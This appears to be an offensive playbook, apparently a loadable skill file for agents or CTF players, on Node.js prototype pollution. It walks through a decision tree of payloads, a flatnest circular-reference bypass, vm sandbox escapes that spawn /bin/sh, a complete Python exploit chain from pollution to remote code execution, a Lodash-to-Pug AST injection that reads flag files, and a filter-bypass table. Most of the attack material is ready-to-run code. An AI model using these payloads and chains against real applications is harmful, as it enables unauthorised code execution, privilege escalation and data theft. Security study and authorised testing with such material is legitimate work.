# Prototype Pollution (Node.js)

## Trigger

Load when you see:

- JSON endpoints that accept arbitrary object structures
- Deep-merge operations: `_.merge()`, `Object.assign()`, jQuery `$.extend()`, `deep-extend`
- Libraries: `flatnest`, `lodash` (< 4.17.5), `qs` (old), `merge`
- Node.js apps using `vm.runInContext()`, `vm.Script`, `happy-dom`, `jsdom`
- Pug/Jade template engine with user-controlled template data
- `__proto__` or `constructor.prototype` keys in request payloads

## Attack Surface

- JSON body parsers that recursively merge user input into existing objects
- App settings read from `options` objects that fall through to `Object.prototype`
- Server-side HTML rendering with `happy-dom` or `jsdom` (JavaScript evaluation settings)
- Template engines (Pug) that read `block` properties from AST nodes
- VM sandboxes that rely on property isolation rather than context isolation

## Decision Tree

1. Try `{"__proto__": {"isAdmin": true}}` on any JSON endpoint
2. Try `{"constructor": {"prototype": {"isAdmin": true}}}` for libraries that block `__proto__`
3. Check for vulnerable merge functions in `package.json` (`flatnest`, `lodash.merge`)
4. If pollution confirmed, look for gadgets: library settings, template properties, auth checks
5. Chain pollution with VM escape if `happy-dom`/`jsdom` renders user-controlled HTML

## Techniques

### Basic Prototype Pollution

```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"a.__proto__.isAdmin": true}
```

### flatnest Circular Reference Bypass (CVE-2023-26135)

`insert()` blocks `__proto__`/`constructor`, but `seek()` (resolves `[Circular (path)]` values) has no checks:

```json
POST /config
{
  "x": "[Circular (constructor.prototype)]",
  "x.settings.enableJavaScriptEvaluation": true
}
```

The `seek()` traversal freely navigates through `constructor.prototype` and returns `Object.prototype`.

### Gadget: Library Settings via Prototype Chain

Libraries read optional settings from the options object. When the caller doesn't provide a setting, it falls through to `Object.prototype`:

```
Happy-DOM: Object.prototype.settings = { enableJavaScriptEvaluation: true }
```

### Node.js VM Sandbox Escape

`vm` is NOT a security boundary. Objects crossing the boundary maintain references to host context.

```javascript
// ESM-compatible escape (CVE-2025-61927)
const ForeignFunction = this.constructor.constructor;
const proc = ForeignFunction("return globalThis.process")();
const spawnSync = proc.binding("spawn_sync");
const result = spawnSync.spawn({
  file: "/bin/sh",
  args: ["/bin/sh", "-c", "cat /flag*"],
  stdio: [
    { type: "pipe", readable: true, writable: false },
    { type: "pipe", readable: false, writable: true },
    { type: "pipe", readable: false, writable: true }
  ]
});
const output = Buffer.from(result.output[1]).toString();

// CommonJS escape
const ForeignFunction = this.constructor.constructor;
const proc = ForeignFunction("return process")();
const result = proc.mainModule.require("child_process").execSync("id").toString();
```

### Full Chain: Prototype Pollution to VM Escape RCE

```python
import requests
TARGET = "http://target:3000"

# Step 1: Pollution via flatnest circular reference
pollution = {
    "x": "[Circular (constructor.prototype)]",
    "x.settings.enableJavaScriptEvaluation": True,
    "x.settings.suppressInsecureJavaScriptEnvironmentWarning": True
}
requests.post(f"{TARGET}/config", json=pollution)

# Step 2: RCE via VM escape in rendered HTML
rce_script = """
const F = this.constructor.constructor;
const proc = F("return globalThis.process")();
const s = proc.binding("spawn_sync");
const r = s.spawn({
  file: "/bin/sh", args: ["/bin/sh", "-c", "cat /flag*"],
  stdio: [{type:"pipe",readable:true,writable:false},
          {type:"pipe",readable:false,writable:true},
          {type:"pipe",readable:false,writable:true}]
});
document.title = Buffer.from(r.output[1]).toString();
"""
r = requests.post(f"{TARGET}/render", json={"html": f"<script>{rce_script}</script>"})
print(r.text.split("<title>")[1].split("</title>")[0])
```

### Lodash Prototype Pollution to Pug AST Injection

```json
{
  "constructor": {
    "prototype": {
      "block": {
        "type": "Text",
        "line": "1;pug_html+=global.process.mainModule.require('fs').readFileSync('/app/demo/flag.txt').toString();//",
        "val": "x"
      }
    }
  },
  "word": "exploit"
}
```

How it works:
1. `_.merge()` sets `Object.prototype.block` to a malicious AST node
2. Pug compilation checks `node.block` on every AST node
3. Nodes without own `block` inherit the polluted one from the prototype
4. `type: "Text"` with `line:` payload executes code during compilation

### Object.create(null) Bypass

Objects created with `Object.create(null)` do NOT inherit from `Object.prototype`, so they resist basic `__proto__` pollution:

```javascript
const safe = Object.create(null);
safe.isAdmin = true;  // No __proto__ access via this object
```

However, if the merge function itself traverses `constructor.prototype`, this bypass is ineffective. Libraries like `lodash.merge` that access `constructor.prototype` explicitly still work.

## Bypass

| Block | Bypass |
|-------|--------|
| `__proto__` filtered | Use `constructor.prototype` instead |
| Both `__proto__` and `constructor` filtered | Use library-specific bypass (e.g., flatnest `[Circular (constructor.prototype)]`) |
| `Object.create(null)` used | Pollution fails against the target object, but may still affect OTHER objects via `Object.prototype` |
| Shallow merge only | Deep merge variant may still be vulnerable |

## Verification

- Send `{"__proto__": {"testProp": true}}` to a JSON endpoint
- Check if all objects in the application now have `testProp` (look for side effects)
- Direct confirmation: send `{"__proto__":{"isAdmin":true}}` then access an admin endpoint

## Pitfalls

- `__proto__` pollution modifies `Object.prototype` globally -- ALL `{}` objects inherit the polluted properties.
- This is not a bug in JavaScript itself -- it's a bug in recursive merge/clone/assign operations.
- Not all merge functions are vulnerable: native `Object.assign` does NOT traverse `__proto__`.
- `vm` sandbox escape works because it's a context ISOLATION issue, not a security sandbox.
- Node.js explicitly warns: "The vm module is not a security mechanism."
- Lodash patched `_.merge()` in version 4.17.5 -- check the actual version in `package-lock.json`.
